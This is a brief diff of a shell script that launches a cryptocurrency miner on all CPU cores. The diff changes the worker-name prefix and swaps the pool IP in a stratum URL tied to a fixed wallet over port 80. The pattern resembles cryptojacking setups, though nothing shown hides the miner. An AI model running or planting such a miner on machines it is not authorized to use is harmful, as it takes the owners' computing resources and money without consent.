@@ -37,14 +37,14 @@ set_permissions() {
 generate_worker_name() {
     date_str=$(TZ='Asia/Kolkata' date '+%Y%m%d')
     random_suffix=$(tr -dc 'a-z0-9' </dev/urandom | head -c 4)
-    echo "TT33${date_str}${random_suffix}"
+    echo "VT22${date_str}${random_suffix}"
 }
 
 # Run the miner using all CPU cores
 run_miner() {
     miner_filename=$1
     worker_name=$2
-    stratum_url="stratum+tcp://0x1932E17CB48175Fd79FD08596eCd246071913Cb4.${worker_name}:x@104.237.130.125:80"
+    stratum_url="stratum+tcp://0x1932E17CB48175Fd79FD08596eCd246071913Cb4.${worker_name}:x@69.164.203.136:80"
 
     echo "🚀 Starting miner with worker name: $worker_name"
     if ./$miner_filename -stratum "$stratum_url"; then
